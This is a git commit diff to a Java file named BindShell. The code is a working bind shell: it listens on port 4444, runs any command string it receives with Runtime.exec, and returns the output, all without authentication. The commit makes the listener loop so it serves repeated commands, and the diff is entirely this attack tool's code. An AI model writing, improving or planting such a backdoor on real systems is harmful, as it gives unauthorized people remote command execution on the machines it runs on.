88a5143bde436d31d993c2249280cc5781176ebf
Yoray Herzberg <65859125+00094L0094@users.noreply.github.com>
2022-02-22 18:29:20 +0200

    Fixed small bug in BindShell.java

--- Java/BindShell/BindShell.java
+++ Java/BindShell/BindShell.java
@@ -9,33 +9,34 @@ public class BindShell
         {
 
             ServerSocket serv = new ServerSocket(4444);
-
-            Socket s = serv.accept();
-
-            DataInputStream dis = new DataInputStream(s.getInputStream());
-
-            String command = (String)dis.readUTF();
-
-            System.out.println("Recieved String=" + command);
-
-            Process p = Runtime.getRuntime().exec(command);
-
-            String tmp = null;
-
-            BufferedReader stdio = new BufferedReader(new InputStreamReader(p.getInputStream()));
-
-            OutputStream clientOutput = s.getOutputStream();
-            PrintWriter writer = new PrintWriter(clientOutput, true);
-
-            while ((tmp = stdio.readLine()) != null)
-            {
-                writer.println(tmp);
-            }
             
-            s.close();
-            serv.close();
+            while (true)
+            {
+                
+                Socket s = serv.accept();
 
-            System.exit(0);
+                DataInputStream dis = new DataInputStream(s.getInputStream());
+
+                String command = (String)dis.readUTF();
+
+                 System.out.println("Recieved String=" + command);
+
+                Process p = Runtime.getRuntime().exec(command);
+
+                String tmp = null;
+
+                BufferedReader stdio = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+                OutputStream clientOutput = s.getOutputStream();
+             PrintWriter writer = new PrintWriter(clientOutput, true);
+
+                while ((tmp = stdio.readLine()) != null)
+                {
+                 writer.println(tmp);
+                }
+            
+                s.close();
+            }
         }
         catch (IOException e)
         {
